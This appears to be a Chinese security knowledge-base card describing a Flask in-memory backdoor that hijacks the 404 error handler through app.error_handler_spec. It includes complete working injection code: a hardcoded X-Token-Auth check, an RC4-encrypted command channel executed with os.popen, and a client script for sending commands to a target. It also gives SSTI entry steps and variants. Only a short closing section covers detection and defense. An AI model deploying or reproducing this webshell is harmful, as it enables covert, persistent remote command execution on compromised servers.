---
id: web-python-framework-flask-error-handler-404-rc4-backdoor
title: Flask error_handler_spec 404 错误处理器内存马：RC4 加密命令通道 + X-Token-Auth 鉴权
type: scenario
domain: web
path: web/python/framework
technique: flask-error-handler-spec-rc4-backdoor
tags:
- web
- python
- flask
- memshell
- backdoor
- rc4
- error-handler
- persistence
- ssti
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V175
  verified_at: '2026-11-06T17:13:41+08:00'
  notes: 已对照原文 SnakeBackdoor-3 代码与图21/24核对 X-Token-Auth、RC4、error_handler_spec[None][code][exc_class]；被 force 收录的差异真实：既有 flask-hook-registry-memshell 卡称直接改 error_handler_spec 不生效，本卡用第三级异常类键并由 Werkzeug/3.1.4 实测流量证明生效。未在本机复跑。
url: /docs/web/python/framework/web-python-framework-flask-error-handler-404-rc4-backdoor/
draft: false
kb_aliases:
- Flask 404 错误处理器后门
- error_handler_spec 内存马
- Flask RC4 加密 webshell
- X-Token-Auth 后门
- Flask 错误处理内存马
- app.error_handler_spec 注入
---

## 一句话结论

在 Flask 应用内取得代码执行后，把 `app.error_handler_spec[None][404][exc_class]` 指向一个自定义 handler，就能让任意不存在的路径触发后门；handler 用 `X-Token-Auth` 头做鉴权、用 RC4 解密 `data` 表单参数并交给 `os.popen` 执行，再把输出 RC4 加密后以 hex 返回，形成不新增路由、不落盘的加密 webshell。

## 原理

- **Flask 错误处理注册表**：Flask 的 `app.error_handler_spec` 是嵌套字典：蓝图名（`None` 表示应用级）→ HTTP 状态码 → 异常类 → handler。`app._get_exc_class_and_code(404)` 返回 `(NotFound, 404)`；直接写 `app.error_handler_spec[None][404][exc_class] = lambda error: backdoor_handler()` 等价于注册 404 错误处理器，且不经过 `@app.errorhandler` 装饰器的 `@setupmethod` 检查。
- **为什么用 404**：任何不存在的 URL 都会触发 404，攻击者不需要新增路由，也不用猜业务路径；后门混在错误处理逻辑里，`app.url_map`/路由表看不到异常条目。
- **第三级键必须是异常类**：`app.error_handler_spec` 的结构是 `蓝图名 -> 状态码 -> 异常类 -> handler`。只写 `app.error_handler_spec[None][404] = ...` 不会命中 Flask 的查找逻辑；必须用 `app._get_exc_class_and_code(404)` 取到 `NotFound` 类，再写入 `[None][404][NotFound]`。样例目标为 Werkzeug/3.1.4 + Python/3.12.3，该写法实际生效并持续响应后门请求。
- **handler 的调用约定**：错误处理器接收异常对象并返回响应体；lambda 直接返回 `backdoor_handler()` 的字符串，Flask 会把它作为 404 响应内容。
- **RC4 加密通道**：`rc4_crypt` 是标准 RC4（KSA + PRGA）。命令以 hex 形式放在 `data` 表单字段，服务端 `unhexlify` 后用 `RC4_SECRET` 解密得到明文命令；`os.popen(cmd).read()` 执行并读取输出，输出再用同一 RC4 加密、hex 编码返回。RC4 是对称流密码，加解密同一函数。
- **鉴权头**：handler 首先检查 `request.headers.get('X-Token-Auth')` 是否等于硬编码 token，不匹配直接返回 `Error`；这使后门在没有 token 时与普通 404 无明显差异。
- **为什么隐蔽**：不写文件、不改路由表、不注册蓝图；只改内存中的错误处理字典，进程重启即消失。流量层面是带 `data` 参数的 404 POST，容易被当成扫描噪声。

## 触发条件

- 已通过 SSTI/任意代码执行在 Flask 进程内执行 Python，且能取得 `app`、`request`、`os`、`binascii` 等对象。
- Flask 应用未重启（内存马只在当前进程有效）。
- 攻击者知道后门 token 与 RC4 密钥（从注入的代码/配置中获取）。
- 目标允许 `os.popen` 执行系统命令（未禁用、无沙箱）。

## 利用步骤

1. 通过 SSTI 取得 `current_app`（如 `url_for.__globals__['current_app']`）与 `request`。
2. 在应用进程内定义 RC4 函数与 `backdoor_handler`，检查 `X-Token-Auth`、解密 `data`、执行命令、加密输出。
3. 取 `exc_class, code = app._get_exc_class_and_code(404)`，写入 `app.error_handler_spec[None][code][exc_class] = lambda error: backdoor_handler()`。
4. 向任意不存在的路径发送 POST，带 `X-Token-Auth` 头和 `data=<hex(RC4(cmd))>`。
5. 收到 hex 响应后 RC4 解密，得到命令输出；重复使用直到完成操作。

## PoC

服务端注入逻辑（在已获得代码执行后执行）：

```python
import os, binascii

exc_class, code = app._get_exc_class_and_code(404)
RC4_SECRET = b'v1p3r_5tr1k3_k3y'

def rc4_crypt(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = bytearray()
    for ch in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(ch ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

def backdoor_handler():
    if request.headers.get('X-Token-Auth') != '3011aa21232beb7504432bfa90d32779':
        return "Error"
    enc_hex_cmd = request.form.get('data')
    if not enc_hex_cmd:
        return ""
    try:
        cmd = rc4_crypt(binascii.unhexlify(enc_hex_cmd), RC4_SECRET).decode('utf-8', 'ignore')
        output = os.popen(cmd).read().encode('utf-8', 'ignore')
        return binascii.hexlify(rc4_crypt(output, RC4_SECRET)).decode()
    except Exception:
        return "Error"

app.error_handler_spec[None][code][exc_class] = lambda error: backdoor_handler()
```

客户端：

```python
import binascii, requests

KEY = b'v1p3r_5tr1k3_k3y'
TOKEN = '3011aa21232beb7504432bfa90d32779'

def rc4(data: bytes, key: bytes) -> bytes:
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0; out = bytearray()
    for ch in data:
        i = (i + 1) % 256; j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(ch ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

def run(cmd: str) -> str:
    payload = binascii.hexlify(rc4(cmd.encode(), KEY)).decode()
    r = requests.post("http://TARGET/not-exist",
                      headers={"X-Token-Auth": TOKEN},
                      data={"data": payload}, timeout=10)
    return rc4(binascii.unhexlify(r.text.strip()), KEY).decode('utf-8', 'ignore')

print(run("id"))
```

## 变体与关联

- 变体：注册到其他状态码/异常类（500、400、任意自定义异常），或改 `app.before_request_funcs`/`after_request_funcs` 等注册表。
- 变体：RC4 换成 AES/XOR/Base64，token 换成 HMAC 签名或请求参数。
- 变体：把 `os.popen` 换成 `subprocess.check_output`、`eval` 或导入执行，扩展为文件管理/内存加载。
- 关联卡片：[[web-python-framework-flask-hook-registry-memshell]]、[[web-python-framework-flask-route-registration-memshell]]、[[web-python-framework-flask-method-override-component-memshell]]、[[defense-detection-flask-memshell-pyrasite-inspect]]。

## 检测与防御

- 检测：Flask 应用内存/运行时检查 `app.error_handler_spec` 是否出现匿名 lambda 或非业务 handler，特别是 404 处理器。
- 检测：大量对不存在路径的 POST 请求，带 `X-Token-Auth` 等自定义头或 `data` 表单字段；响应体为 hex 字符串且长度与命令输出相关。
- 检测：Web 进程异常调用 `os.popen`/`subprocess`，子进程命令行与请求时间相关。
- 防御：消除 SSTI/任意代码执行入口；模板使用固定模板与参数绑定；限制 `eval`/`exec`/`os.popen`；应用重启可清除内存马，但需先修复入口。
- 防御：WAF 对 404 POST + 自定义鉴权头 + hex 大字段组合告警；运行时 RASP 监控错误处理器注册。
